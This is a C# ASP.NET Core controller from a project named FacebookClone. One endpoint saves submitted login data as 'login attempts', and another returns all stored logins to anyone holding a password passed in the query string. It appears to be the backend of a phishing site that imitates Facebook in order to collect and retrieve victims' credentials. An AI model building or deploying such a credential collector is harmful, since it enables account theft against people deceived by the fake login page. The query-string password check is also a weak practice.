using FacebookClone.DTOs;
using FacebookClone.Interfaces;
using FacebookClone.Services.Exceptions;
using Microsoft.AspNetCore.Mvc;

namespace FacebookClone.Controllers;

[ApiController]
public class LoginsController : ControllerBase
{
    private readonly ILoginService _loginService;

    public LoginsController(ILoginService loginService)
    {
        _loginService = loginService;
    }
    
    [HttpPost("/login")]
    public async Task<IActionResult> PostLogin([FromBody] LoginRequest request)
    {
        if (!ModelState.IsValid)
        {
            return BadRequest(ModelState);
        }
            
        await _loginService.CreateLoginAttemptAsync(request);
        return Ok(new { message = "Datos de login guardados." });
    }


    [HttpGet("/logins")]
    public async Task<IActionResult> GetLogins([FromQuery] string password)
    {
        if (string.IsNullOrEmpty(password))
        {
            return BadRequest(new { message = "Se requiere el parámetro 'password'." });
        }

        try
        {
            var logins = await _loginService.GetAllLoginsAsync(password);
            return Ok(logins);
        }
        catch (AppUnauthorizedException ex)
        {
            return Unauthorized(new { message = ex.Message });
        }
        catch (Exception)
        {
            return StatusCode(500, new { message = "Error interno del servidor." });
        }
    }
}